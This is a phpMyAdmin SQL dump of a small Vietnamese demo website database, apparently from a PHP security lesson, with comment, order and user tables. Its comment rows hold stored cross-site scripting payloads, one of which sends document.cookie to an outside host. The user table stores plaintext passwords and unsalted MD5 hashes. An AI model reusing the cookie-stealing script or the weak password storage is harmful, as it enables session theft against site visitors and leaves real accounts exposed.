-- phpMyAdmin SQL Dump
-- version 5.1.0
-- https://www.phpmyadmin.net/
--
-- Máy chủ: 127.0.0.1
-- Thời gian đã tạo: Th7 31, 2021 lúc 12:56 PM
-- Phiên bản máy phục vụ: 10.4.18-MariaDB
-- Phiên bản PHP: 8.0.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `unt`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `tbl_comment`
--

CREATE TABLE `tbl_comment` (
  `comment_id` int(11) NOT NULL,
  `username` varchar(11) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `content` text COLLATE utf8mb4_vietnamese_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Đang đổ dữ liệu cho bảng `tbl_comment`
--

INSERT INTO `tbl_comment` (`comment_id`, `username`, `content`) VALUES
(1, 'Quan Tinh', 'tui đã được login'),
(2, 'Nhuanminh', 'tui ko thể tin bạn '),
(3, 'namhai', 'Hay quá'),
(4, 'cuongguru', 'Đúng rồi '),
(5, 'Hatang', '<b>Tôi đi hack website của bạn</b>'),
(6, 'haiyen', '<script>alert(\"website đã bị hack\");</script>'),
(7, 'vanthang', '<b>abc</b>'),
(8, 'nguyenphat', '&lt;b&gt;abc&lt;/b&gt;'),
(9, 'minhha', '&lt;script&gt;window.location=&quot;http://unitop.vn?cookie=&quot;+document.cookie;\r\n&lt;/script&gt;'),
(43, 'hacker 3', '&lt;script&gt;\r\nalert(&quot;Website của bạn đ&atilde; bị hacker&quot;);\r\n&lt;/script&gt;'),
(44, 'hacker 3', '&lt;script&gt;\r\nalert(&quot;Website của bạn đã bị hacker&quot;);\r\n&lt;/script&gt;');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `tbl_orders`
--

CREATE TABLE `tbl_orders` (
  `order_id` int(11) NOT NULL,
  `total` int(100) NOT NULL,
  `custom_name` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `city` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Đang đổ dữ liệu cho bảng `tbl_orders`
--

INSERT INTO `tbl_orders` (`order_id`, `total`, `custom_name`, `city`) VALUES
(1, 960000, 'Hà Quan Tính', 'Gia Lai'),
(2, 860000, 'Trần Việt Hoàng', 'Đà Nẵng'),
(3, 3860000, 'Hà Mạnh Sơn', 'Hà Nội'),
(4, 499000, 'Phạm Trà My', 'Huế'),
(5, 1280000, 'Đức Chí Trung', 'Huế'),
(6, 4360000, 'Trần Đức Hiếu', 'Hà Nội');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `tbl_users`
--

CREATE TABLE `tbl_users` (
  `user_id` int(11) NOT NULL,
  `username` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `fullname` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `email` varchar(100) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `age` int(100) NOT NULL,
  `gender` enum('male','female') COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `password` varchar(40) COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `earn` int(11) DEFAULT NULL COMMENT 'Đơn vị $'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_vietnamese_ci;

--
-- Đang đổ dữ liệu cho bảng `tbl_users`
--

INSERT INTO `tbl_users` (`user_id`, `username`, `fullname`, `email`, `age`, `gender`, `password`, `earn`) VALUES
(1, 'quantinh', 'Hà Quan Tính', 'htinh7444@gmail.com', 21, 'male', 'Quantinh!@#', 16),
(2, 'Nhuanminh', 'Hoàng Nhuận Minh', 'nhuanminh2610@gmail.com', 25, 'male', '86a3414a7778a90c39132c781e3346ef', 67),
(3, 'namhai', 'Nguyễn Hải Nam', 'hainam123@gmail.com', 27, 'male', '54b41981bebd0b6c2a8553ee5c1e2f9b', 200),
(4, 'cuongguru', 'Nam Cường', 'cuong34@gmail.com', 35, 'male', '188c979b22d6ddcfcaf1ed12e4378028', 1000),
(5, 'Hatang', 'Tăng Thanh Hà', 'thanhha123@gmail.com', 35, 'female', '991e1acfaab9d75ab544ef71cc9fdbe5', 465),
(6, 'haiyen', 'Chu Hải Yến', 'haiyen@gmail.com', 23, 'female', 'e10adc3949ba59abbe56e057f20f883e', 67),
(7, 'vanthang', 'Nguyễn Văn Thắng', 'vanthang@gmail.com', 22, 'male', '561551d0969103416119f977b771ec47', 12),
(8, 'nguyenphat', 'Phạm Nguyên Phát', 'nguyenphat@gmail.com', 21, 'male', '25d55ad283aa400af464c76d713c07ad', 34),
(9, 'minhnha', 'Phạm Trần Minh Nhã', 'minhnha@gmail.com', 30, 'female', 'b96a2a603ca32293c10303f98e644fa0', 56),
(10, 'ha1995', 'Nguyễn Thị Hà', 'nguyenha@gmail.com', 36, 'female', '02fc759ec76bf89f93927a8a7a476493', 78),
(11, 'kimhang', 'Hà Kim Hằng', 'kimhang@gmail.com', 40, 'female', 'fd95a22203c21a59ad2c925e4f2b5da5', 89),
(12, 'vantoan', 'Hoàng Văn Toàn', 'vantoan@gmail.com', 45, 'male', '9a6c9c456e35a97a6a9502cda63d370e', 10),
(13, 'xuanthang', 'Nguyễn Xuân Thắng', 'xuanthang123@gmail.com', 32, 'male', '945469f6a75e9a60a50fb7793e816cc9', 45),
(14, 'quynhnhu', 'Trần Thị Quỳnh Như', 'quynhnhu@gmail.com', 21, 'female', '32b2f366f6eed94301db605462307dd9', 56),
(16, 'admin', 'Ha Quan Tinh', 'htinh74442gmail.com', 22, 'male', 'admin!@#', 3500),
(43, 'quantuan', 'Huỳnh Quan Tuấn', 'quantuan@gmail.com', 0, 'male', '206082e9efd10f6d751a609a83497746', NULL),
(45, 'thevan', 'Đăng Thế Văn', 'thevan1122@gmail.com', 0, 'male', 'Thevan465', NULL),
(48, 'luanngoc', 'Đoàn Ngọc Lân', 'luanngoc123@gmail.com', 0, 'male', 'Ngoclan123!@#', NULL),
(49, 'longtho', 'Nguyễn Thọ Long', 'longtho123@gmail.com', 0, 'male', 'Longtho!@#', NULL);

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `tbl_comment`
--
ALTER TABLE `tbl_comment`
  ADD PRIMARY KEY (`comment_id`);

--
-- Chỉ mục cho bảng `tbl_orders`
--
ALTER TABLE `tbl_orders`
  ADD PRIMARY KEY (`order_id`);

--
-- Chỉ mục cho bảng `tbl_users`
--
ALTER TABLE `tbl_users`
  ADD PRIMARY KEY (`user_id`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `tbl_comment`
--
ALTER TABLE `tbl_comment`
  MODIFY `comment_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=45;

--
-- AUTO_INCREMENT cho bảng `tbl_orders`
--
ALTER TABLE `tbl_orders`
  MODIFY `order_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT cho bảng `tbl_users`
--
ALTER TABLE `tbl_users`
  MODIFY `user_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=50;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
